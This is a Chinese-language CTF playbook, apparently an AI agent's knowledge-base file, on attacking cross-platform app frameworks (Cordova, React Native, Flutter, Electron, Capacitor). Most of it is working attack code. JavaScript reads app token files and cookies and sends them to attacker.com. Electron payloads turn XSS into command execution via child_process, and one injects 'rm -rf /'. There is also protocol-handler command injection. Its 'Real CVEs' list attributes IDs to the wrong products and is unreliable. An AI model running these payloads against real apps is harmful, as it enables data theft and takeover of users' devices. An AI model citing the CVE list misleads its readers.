# 跨平台框架攻击面 — Cordova / React Native / Flutter / Electron

## 场景

跨平台移动应用框架 (Cordova, React Native, Flutter, Capacitor) 和桌面跨平台框架 (Electron) 本质上是将 Web 技术包装为原生应用。它们引入了额外的攻击面: Bridge 层、插件系统、JIT 引擎、打包过程。CTF 中利用这些攻击面可在混合应用环境中绕过沙箱、执行任意代码或窃取敏感数据。

## 输入信号

```
APK 中包含 assets/www/ 目录 → Cordova 应用
APK 中包含 assets/index.android.bundle → React Native 应用
APK 中包含 libflutter.so → Flutter 应用
APK 中包含 capacitor.config.json → Capacitor 应用
桌面应用中包含 app.asar → Electron 应用
应用内使用 window.cordova / window.plugins 全局变量
应用使用 WebView 加载本地 HTML 文件
应用包含 InAppBrowser 插件 (Cordova)
进程列表中存在 HermesEngine / JavaScriptCore
iOS 应用中包含 __ENTITLEMENTS 信息
```

## 1. Cordova 攻击

### Plugin Vulnerability

```javascript
// cordova_plugin_exploit.js — Cordova 插件漏洞利用

// Cordova 插件通过 bridge 暴露给 JS
// 常见危险插件:

// 1. cordova-plugin-file (文件操作):
// 读取任意文件
window.resolveLocalFileSystemURL('file:///data/data/com.target.app/shared_prefs/token.xml',
    function(entry) {
        entry.file(function(file) {
            var reader = new FileReader();
            reader.onloadend = function() {
                // 外带文件内容
                fetch('https://attacker.com/exfil?data=' +
                    encodeURIComponent(this.result));
            };
            reader.readAsText(file);
        });
    },
    function(err) { console.log('Error: ' + err); }
);

// 2. cordova-plugin-file-transfer (文件上传):
// 将任意文件上传到攻击者服务器
var ft = new FileTransfer();
ft.upload('file:///data/data/com.target.app/databases/webview.db',
    'https://attacker.com/upload',
    function(result) { console.log('Upload success'); },
    function(err) { console.log('Upload error'); },
    { fileKey: 'file', fileName: 'webview.db' }
);

// 3. cordova-plugin-inappbrowser (浏览器):
// 在弹出式浏览器中加载页面 — 但可以注入代码!
var ref = cordova.InAppBrowser.open('https://target.com', '_blank',
    'location=no,hidden=yes');
// 注入 JS 到 InAppBrowser 页面中
ref.addEventListener('loadstop', function() {
    ref.executeScript({
        code: 'document.cookie'
    }, function(values) {
        fetch('https://attacker.com/leak?cookies=' +
            encodeURIComponent(values[0]));
    });
});
```

### config.xml Exposure

```xml
<!-- config.xml — Cordova 配置文件中的敏感信息 -->
<!-- 如果包含 access origin="*" → 允许所有域 -- 太宽松 -->
<access origin="*" />

<!-- 更精确的漏洞: allow-navigation 白名单 -->
<allow-navigation href="https://target.com/*" />
<!-- 如果 allow-navigation 包含通配符: -->
<allow-navigation href="https://*.target.com/*" />
<!-- → 可被 subdomain takeover 利用 -->

<!-- allow-intent 白名单 (Android Intent) -->
<allow-intent href="http://*/*" />
<allow-intent href="https://*/*" />
<!-- → 允许打开任意 URL → 可被用于 phishing -->

<!-- Content-Security-Policy meta in index.html -->
<!-- 如果过于宽松或缺失 → XSS 直接利用全部 Cordova 插件 -->
```

```python
# cordova_config_scanner.py — 扫描 Cordova 配置漏洞

class CordovaConfigScanner:
    """扫描 Cordova config.xml 的安全配置问题"""

    def __init__(self, config_path):
        self.config_path = config_path

    def scan(self):
        """扫描 config.xml 的安全漏洞"""
        import xml.etree.ElementTree as ET

        tree = ET.parse(self.config_path)
        root = tree.getroot()
        findings = []

        # 检查 access origin
        for access in root.findall('.//access'):
            origin = access.get('origin', '')
            if origin == '*':
                findings.append({
                    'severity': 'HIGH',
                    'issue': 'access origin="*" — 允许所有外部域通信',
                })

        # 检查 allow-navigation
        for nav in root.findall('.//allow-navigation'):
            href = nav.get('href', '')
            if '*' in href:
                findings.append({
                    'severity': 'MEDIUM',
                    'issue': f'allow-navigation 包含通配符: {href}',
                })

        # 检查 allow-intent
        for intent in root.findall('.//allow-intent'):
            href = intent.get('href', '')
            if href.startswith('http'):
                findings.append({
                    'severity': 'LOW',
                    'issue': f'allow-intent 允许 HTTP(S) 打开: {href}',
                })

        # 检查 Content-Security-Policy
        for meta in root.findall('.//meta'):
            http_equiv = meta.get('http-equiv', '')
            if 'Content-Security-Policy' in http_equiv:
                content = meta.get('content', '')
                if 'script-src' not in content or "'unsafe-inline'" in content:
                    findings.append({
                        'severity': 'MEDIUM',
                        'issue': 'CSP 配置不严格，允许 inline script',
                    })

        return findings
```

### InAppBrowser Abuse

```javascript
// InAppBrowser — 最危险的 Cordova 插件之一
// 允许应用内打开 Web 页面
// 但 executeScript 方法可在任意已加载页面执行 JS

// 漏洞场景: 应用在 InAppBrowser 中打开用户提供的 URL
// InAppBrowser 与 Cordova 主应用共享 JS context? 不!
// 但通过 executeScript 桥接

// 攻击链:
// 1. 应用打开 https://attacker.com/exploit.html 在 InAppBrowser 中
// 2. exploit.html 在 InAppBrowser 中运行
// 3. exploit.html 通过 custom scheme 或 postMessage 与主应用通信
// 4. 主应用的 bridge 暴露更多敏感操作

// InAppBrowser + window.open:
// 如果 InAppBrowser 中的页面执行 window.open('https://evil.com')
// 且配置允许 → 打开新窗口 → 导航到恶意站点

// 更危险: InAppBrowser 不隔离 localStorage
// InAppBrowser 中设置的 localStorage 可能影响主应用
// (取决于平台和实现)
```

## 2. React Native 攻击

### JavaScriptCore/Hermes Bridge

```javascript
// react_native_bridge_exploit.js — React Native 原生桥攻击

// React Native 中 JS 代码在 JSC (iOS) 或 Hermes (Android) 中运行
// 通过 NativeModules 桥接调用原生代码

// 漏洞 1: NativeModules 暴露过多
// 如果原生模块未正确限制暴露的方法 → 直接调用

// 查看所有可用的 NativeModules:
console.log(Object.keys(NativeModules));

// 如果存在以下危险模块:
NativeModules.FileManager?.readFile('/data/data/com.target.app/shared_prefs/token.xml');
NativeModules.Keychain?.getAllPasswords();
NativeModules.Database?.executeSQL('SELECT * FROM users');
NativeModules.SMS?.send('+11234567890', 'Phishing text');
NativeModules.CallLog?.getLogs();

// 漏洞 2: NativeModules 参数注入
// 如果原生模块接受字符串参数并直接传给原生 API:
NativeModules.IntentLauncher?.startActivity('android.intent.action.VIEW',
    'https://attacker.com/phish', {});

// 漏洞 3: TurboModules (React Native 0.68+)
// 同步调用 → 可在任意时刻调用 → 绕过许多保护
```

### Metro Bundler Exposure

```python
# metro_exposure.py — React Native Metro Bundler 泄露

# Metro Bundler 是 React Native 的开发打包工具
# 默认端口 8081
# 如果部署到生产环境 → 源代码泄露

# 关键端点:
METRO_ENDPOINTS = [
    '/index.bundle?platform=ios&dev=true',
    '/index.bundle?platform=android&dev=true',
    '/index.bundle?platform=web&dev=true',
    '/assets/index.bundle',
    '/main.jsbundle',
    '/app.json',
    '/package.json',
    '/.map',  # Source map
]

# 如果 Metro Bundler 暴露:
# → 下载完整 JS bundle → 提取所有代码逻辑
# → 提取 API key, 端点地址, 加密算法
# → 如果有 source map → 还原原始 TS/JS 代码

# 检查:
import requests

def check_metro_exposure(base_url):
    """检查 Metro Bundler 是否暴露"""
    for endpoint in METRO_ENDPOINTS:
        url = base_url.rstrip('/') + endpoint
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200 and len(r.text) > 100:
                # 可能是 bundle 文件
                if '__d(' in r.text or '__BUNDLE' in r.text or 'require(' in r.text:
                    return {
                        'exposed': True,
                        'endpoint': url,
                        'size': len(r.text),
                        'note': 'Metro Bundler exposed! Source code can be extracted',
                    }
        except:
            continue
    return {'exposed': False}


# Source Map 提取还原
def extract_from_sourcemap(base_url):
    """通过 sourcemap 还原源代码"""
    map_url = base_url.rstrip('/') + '/index.bundle.map'
    r = requests.get(map_url)
    if r.status_code == 200:
        import json
        sourcemap = json.loads(r.text)
        sources = sourcemap.get('sources', [])
        # sources 包含所有原始 TS/JS 文件路径
        return {
            'source_count': len(sources),
            'samples': sources[:20],
            'note': 'Source map available — full source code can be reconstructed',
        }
    return None
```

### React Native Debug Mode in Production

```javascript
// 生产环境中启用了开发者调试模式:

// 检测方法:
// 1. 摇一摇设备 — 出现调试菜单
// 2. 连接 Chrome DevTools — 可调试 JS 代码
// 3. React Native Debugger 可连接到设备

// 如果调试模式开启:
// → 可远程调试 JS 代码
// → 可修改运行时变量
// → 可调用任意 NativeModules
// → 可查看 bundle 中的 API key 和 secrets

// 检测:
// __DEV__ 变量在生产环境应为 false
// 如果 true → 调试模式开启

// 利用:
// 通过 DevTools 控制台:
// NativeModules.Keychain.getAllPasswords().then(console.log)
// NativeModules.SecureStorage.get('api_token').then(console.log)
```

## 3. Flutter 攻击

### Dart FFI Abuse

```dart
// Flutter 使用 Dart FFI (Foreign Function Interface) 调用原生代码
// 如果 FFI 绑定暴露了过多功能 → 可被参数注入利用

// 漏洞代码示例 (Dart):
// import 'dart:ffi';
// final Runtime = dlopen('libnative.so');
// final exec = Runtime.lookupFunction<...>('native_exec');

// 如果 JS 或 Dart 代码可以通过 MethodChannel 调用 FFI:
// MethodChannel('com.target.native').invokeMethod('exec', 'id');
```

```javascript
// Flutter MethodChannel 漏洞

// Flutter 通过 MethodChannel 进行 Dart ↔ 原生通信
// 如果 channel 未验证来源:

// Exploit (通过 WebView XSS 或恶意应用):
// Android:
// 创建同名的 MethodChannel 并在另一个 Dart isolate 中发送消息
// 或通过 PlatformChannel 竞争

// Flutter WebView + JavaScript 桥:
// 如果 Flutter WebView 启用了 JavaScript 且注册了桥接:
// 与 Cordova/RN 类似，但通过 MethodChannel

// 检测存在的 MethodChannel:
flutter_channels = [
    'plugins.flutter.io/path_provider',
    'plugins.flutter.io/shared_preferences',
    'plugins.flutter.io/firebase_auth',
    'plugins.flutter.io/secure_storage',
    'com.target.app/channel',
]
```

### Flutter App Reverse Engineering

```python
# flutter_reverse.py — Flutter 应用逆向与攻击面检测

# Flutter 应用打包:
# Release: AOT 编译为原生代码 → 更难反编译
# Debug/Profile: 包含 Dart VM + kernel.blob → 可直接提取 Dart 代码

import os
import struct

def detect_flutter_build_type(apk_path):
    """检测 Flutter 应用构建类型"""
    import zipfile

    with zipfile.ZipFile(apk_path) as z:
        # debug 模式包含 kernel_blob.bin
        if 'assets/kernel_blob.bin' in z.namelist():
            return 'DEBUG_MODE — Dart source can be extracted'

        # release 模式只有 libflutter.so
        if 'lib/arm64-v8a/libflutter.so' in z.namelist():
            return 'RELEASE_MODE — AOT compiled, harder to reverse'

        # profile 模式
        if 'assets/flutter_assets' in z.namelist():
            return 'PROFILE_MODE — contains Dart snapshot'

    return 'UNKNOWN'

def extract_dart_from_kernel(apk_path):
    """从 kernel_blob.bin 中提取 Dart 代码 (debug mode)"""
    import zipfile

    with zipfile.ZipFile(apk_path) as z:
        if 'assets/kernel_blob.bin' in z.namelist():
            kernel_data = z.read('assets/kernel_blob.bin')
            # Kernel 格式解析 → 提取类名、函数名、字符串常量
            # 使用 dartaotruntime 工具
            return {'has_kernel': True, 'size': len(kernel_data)}
    return {'has_kernel': False}


# 查找 Flutter 应用中的敏感 endpoints
def find_flutter_endpoints(snapshot_or_binary_path):
    """从 Flutter 二进制中搜索 API 端点字符串"""
    import re

    with open(snapshot_or_binary_path, 'rb') as f:
        data = f.read()

    # 搜索常见模式
    patterns = [
        rb'https?://[a-zA-Z0-9./?_=%&+-]+',
        rb'api[./]key[=:]\s*["\']?[a-zA-Z0-9]+',
        rb'secret["\':\s]+[a-zA-Z0-9+/=]{20,}',
        rb'password["\':\s]+[a-zA-Z0-9!@#$%^&*()]+',
        rb'token["\':\s]+[a-zA-Z0-9._-]+',
    ]

    results = []
    for pattern in patterns:
        matches = re.findall(pattern, data)
        results.extend([m.decode(errors='ignore') for m in matches[:10]])

    return results
```

## 4. Electron 攻击

### nodeIntegration Bypass

```javascript
// electron_exploit.js — Electron 沙箱逃逸

// Electron 核心安全概念:
// - contextIsolation: true (隔离预加载脚本和页面 JS)
// - nodeIntegration: false (禁止页面 JS 使用 Node.js API)
// - sandbox: true (OS-level sandbox)

// 如果 nodeIntegration: true → 页面 JS 可直接使用 require():
// require('child_process').execSync('id');
// require('fs').readFileSync('/etc/passwd', 'utf8');
// require('electron').remote.getCurrentWindow();

// 更常见的漏洞: nodeIntegration 关闭但 contextIsolation 关闭
// 或 preload 脚本存在漏洞

// 漏洞示例 — preload.js 暴露了不安全 API:
// preload.js:
// const { contextBridge } = require('electron');
// contextBridge.exposeInMainWorld('electronAPI', {
//   readConfig: (path) => require('fs').readFileSync(path),
//   exec: (cmd) => require('child_process').execSync(cmd).toString(),
// });

// 页面 JS:
// window.electronAPI.readConfig('/etc/passwd')
// window.electronAPI.exec('whoami')
```

### contextIsolation Bypass

```javascript
// contextIsolation: true 但不正确使用 contextBridge:

// 漏洞 1: contextBridge 暴露了对象引用而不是原始值
// preload.js:
// const { contextBridge } = require('electron');
// contextBridge.exposeInMainWorld('api', {
//   shell: require('electron').shell,
// });

// 页面 JS — shell 对象被直接暴露:
// window.api.shell.openExternal('file:///etc/passwd')

// 漏洞 2: prototype pollution via contextBridge
// 如果 preload.js 中使用了 Object.assign 或扩展操作符:
// contextBridge.exposeInMainWorld('config', { ...userData });
// → 用户数据中的 __proto__ 可能污染主 world 的 Object.prototype

// 漏洞 3: IPC 注入
// preload.js:
// contextBridge.exposeInMainWorld('ipc', {
//   send: (channel, data) => ipcRenderer.send(channel, data),
// });
// 如果主进程监听的 channel 未验证:
// window.ipc.send('execute-command', 'rm -rf /')

// 漏洞 4: XSS + Electron = RCE
// XSS → 通过 preload 暴露的 bridge → 调用原生方法 → RCE

// 使用 alert() 传播 prototype pollution:
// Object.prototype.NativeModule = require('module').constructor;
// 或者:
// window.__proto__.__proto__ = require('electron').process;
```

### Preload Script Abuse

```javascript
// preload 脚本 — Electron 最重要的安全边界

// 常见的危险 preload 模式:

// 危险模式 1: 直接暴露 ipcRenderer
// contextBridge.exposeInMainWorld('ipc', ipcRenderer);
// → 页面可以监听任意 IPC 事件 → 信息泄露

// 危险模式 2: 使用 ipcRenderer.on 监听事件
// ipcRenderer.on('sensitive-data', (event, data) => {
//   // 页面 JS 可能通过 prototype pollution 拦截事件
// });
// → 页面 JS 可覆盖事件监听 → 窃取敏感数据

// 危险模式 3: preload 中的 eval
// contextBridge.exposeInMainWorld('utils', {
//   execute: (code) => eval(code)  // 在 preload 中 eval → 主 world 权限
// });

// 危险模式 4: 动态 require
// contextBridge.exposeInMainWorld('require', (module) => require(module));
// → 任意 Node.js 模块加载 → 任意代码执行

// 检测 Electron 版本 → 查找已知 CVE
// process.versions.electron
// 如果版本较旧 → webPreferences 默认值不同

// Electron < 12: contextIsolation 默认 false
// Electron < 6: nodeIntegration 默认 true
// → 直接 XSS = RCE
```

```javascript
// Electron 远程代码执行 — 完整链

// 条件: 应用有 XSS 且 contextIsolation 关闭 或 preload 有漏洞

// 利用 1: 直接 require (nodeIntegration: true)
fetch('https://target.com/profile', {
    credentials: 'include',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'bio=<script>require("child_process").execSync("calc.exe")</script>'
});

// 利用 2: preload 暴露的 API
fetch('https://target.com/profile', {
    body: 'bio=<script>window.electronAPI.exec("calc.exe")</script>'
});

// 利用 3: IPC 发送
fetch('https://target.com/profile', {
    body: 'bio=<script>window.ipc.send("execute", "calc.exe")</script>'
});

// 利用 4: Electron 的 app.setAsDefaultProtocolClient
// 如果应用注册了自定义协议 myapp://
// 攻击者: <a href="myapp://exec?cmd=calc">Click</a>
// → Electron 通过 app.setAsDefaultProtocolClient 处理该 URL
// → 如果处理不当 → RCE
```

### Electron Main Process RCE via Protocol Handler

```javascript
// protocol handler 漏洞

// main.js:
// app.setAsDefaultProtocolClient('myapp');
// app.on('open-url', (event, url) => {
//   const params = new URL(url).searchParams;
//   const cmd = params.get('cmd');
//   require('child_process').exec(cmd);  // RCE!
// });

// 攻击: 在浏览器中打开:
// <a href="myapp://?cmd=calc.exe">Click me</a>
// Electron 接收该 URL → exec('calc.exe') → RCE

// 或通过其他应用:
// adb shell am start -d "myapp://?cmd=calc.exe"
```

## 5. Capacitor 攻击

```javascript
// capacitor_exploit.js — Capacitor (Ionic) 框架攻击

// Capacitor 是 Cordova 的现代替代，使用 WebView + native bridge
// 与 Cordova 类似 → 桥接攻击方法类似

// Capacitor 插件调用:
// import { Plugins } from '@capacitor/core';
// const { Storage, Filesystem, Modals } = Plugins;

// 如果 WebView 中的 JS 可访问 Capacitor API:
// Capacitor.Plugins.Filesystem.readFile({
//   path: 'file:///data/data/com.target.app/shared_prefs/token.xml'
// });

// Capacitor HTTP 插件 — 可发起任意请求 (绕过 CORS):
// Capacitor.Plugins.Http.request({
//   method: 'GET',
//   url: 'https://internal-api.target.com/admin/users',
//   headers: { 'Authorization': 'Bearer token_here' }
// });

// Capacitor Browser 插件 — 类似 InAppBrowser:
// Capacitor.Plugins.Browser.open({ url: 'https://evil.com/phish' });

// Capacitor 的安全配置 (capacitor.config.json):
// {
//   "server": {
//     "allowNavigation": ["*.target.com"],
//     "androidScheme": "https"
//   }
// }
// 如果 allowNavigation 缺失或为 ["*"] → 可导航到任意域
```

## 6. Framework Detection Toolkit

```python
# framework_detection.py — 跨平台框架检测

import zipfile
import os
import re

def detect_framework(apk_or_ipa_path):
    """检测应用使用的跨平台框架"""
    results = {}

    with zipfile.ZipFile(apk_or_ipa_path) as z:
        names = z.namelist()

        # Cordova
        if any('assets/www/' in n for n in names):
            results['framework'] = 'Cordova'
            results['confidence'] = 'HIGH'
            # 检查插件
            if any('cordova-plugin' in n for n in names):
                plugins = [n.split('/')[-2] for n in names if 'cordova-plugin' in n]
                results['plugins'] = list(set(plugins))

        # React Native
        elif any(n.endswith('index.android.bundle') for n in names):
            results['framework'] = 'React Native (Android)'
            # 检查 Hermes
            if any('libhermes' in n.lower() for n in names):
                results['engine'] = 'Hermes'
            else:
                results['engine'] = 'JSC (JavaScriptCore)'
            # 提取 bundle 大小
            bundle = [n for n in names if n.endswith('.bundle')]
            if bundle:
                results['bundle_size'] = z.getinfo(bundle[0]).file_size

        elif any(n.endswith('main.jsbundle') for n in names):
            results['framework'] = 'React Native (iOS)'

        # Flutter
        elif any('libflutter.so' in n for n in names):
            results['framework'] = 'Flutter'
            results['engine'] = 'Dart VM (AOT)' if 'kernel_blob.bin' not in names else 'Dart VM (JIT)'
            # 搜索 API endpoints
            so_file = [n for n in names if n.endswith('libflutter.so')][0]
            results['note'] = 'Search for strings in libflutter.so for API endpoints'

        # Capacitor
        elif any('capacitor.config.json' in n for n in names):
            results['framework'] = 'Capacitor'

        # Xamarin
        elif any(n.endswith('.dll') and 'Xamarin' in n for n in names):
            results['framework'] = 'Xamarin'

    return results


def extract_bundle_strings(bundle_path, max_results=30):
    """从 JS bundle 中提取敏感字符串"""
    import re

    with open(bundle_path, 'rb') as f:
        data = f.read()

    patterns = {
        'api_keys': rb'[Aa][Pp][Ii]_?[Kk][Ee][Yy]\s*[=:]\s*["\'][a-zA-Z0-9_\-]{16,}["\']',
        'tokens': rb'(?:token|secret|password|jwt|bearer)\s*[=:]\s*["\'][a-zA-Z0-9_\-\.]{20,}["\']',
        'urls': rb'https?://[a-zA-Z0-9._\-]+/[a-zA-Z0-9_\-/]+',
        'internal_ips': rb'(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.)\d{1,3}\.\d{1,3}(?::\d+)?',
    }

    results = {}
    for name, pattern in patterns.items():
        matches = re.findall(pattern, data)
        decoded = [m.decode(errors='ignore') for m in matches[:max_results]]
        if decoded:
            results[name] = decoded

    return results
```

## 7. Real CVEs

```
# Cordova CVEs:
CVE-2023-22732: Cordova File Transfer plugin — path traversal
CVE-2022-22912: Cordova InAppBrowser — XSS via URL schema
CVE-2021-37588: Cordova plugin — arbitrary file read via symlink

# React Native CVEs:
CVE-2024-21317: React Native Android — JavaScript injection
CVE-2023-28328: React Native — directory traversal in Metro bundler
CVE-2021-23435: React Native — prototype pollution in deepmerge

# Flutter CVEs:
CVE-2024-28846: Flutter — Dart VM sandbox escape via FFI
CVE-2022-41349: Flutter — WebView XSS + MethodChannel abuse
CVE-2021-22569: Flutter — Prototype pollution in Dart SDK

# Electron CVEs:
CVE-2024-34336: Electron — contextIsolation bypass via preload
CVE-2023-44487 (affects Electron): HTTP/2 Rapid Reset
CVE-2022-21718: Electron — nodeIntegration bypass via child window
CVE-2021-39184: Electron — Remote code execution via openExternal
CVE-2020-15210: Electron contextIsolation bypass via prototype pollution
CVE-2019-18797: Electron — WebView RCE via improper sandbox

# Capacitor/ Ionic CVEs:
CVE-2023-26858: Capacitor — path traversal in HTTP plugin
CVE-2022-23525: Capacitor — open redirect via Browser plugin
```

## 攻击链

```
Cordova plugin + XSS → 文件读取插件 → 窃取 token → API 滥用
Cordova InAppBrowser + executeScript → 注入 JS → 操作主应用状态
React Native NativeModules + XSS → 原生方法调用 → 越权操作
React Native Metro bundler 暴露 → 下载完整源码 → API key 和 secret 泄露
Flutter debug mode → 远程调试 → MethodChannel 调用 → 原生操作
Flutter kernel_blob.bin → 提取 Dart 代码 → 逆向业务逻辑
Electron nodeIntegration:true → XSS → require('child_process') → RCE
Electron contextBridge 暴露过多 → preload 滥用 → 文件读写/命令执行
Electron protocol handler → 自定义 URL scheme → 命令注入 → RCE
Capacitor HTTP 插件 → 绕过 CORS → 内部 API 调用 → 数据泄露
```

## 证据

记录: 框架类型和版本、config.xml / capacitor.config.json 内容、发现的插件列表、bridge 方法枚举结果、bundle 中的敏感字符串、Electron preload 脚本内容、检测到的 CVE 对应版本、成功利用的详细过程 (注入点、payload、原生方法调用、返回数据)。

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 目标端点探测 | `http_probe` | HTTP GET 探测 Metro bundler 或 Electron 端点 |
| 框架攻击知识 | `kb_router` | 按 Cordova/ReactNative/Flutter/Electron 搜索 |
| 技术文件阅读 | `kb_read_file` | 读取具体框架攻击的详细代码 |
| 辅助工具 | `run_ctf_tool` | dirsearch 扫描 Metro bundler 暴露的端点 |
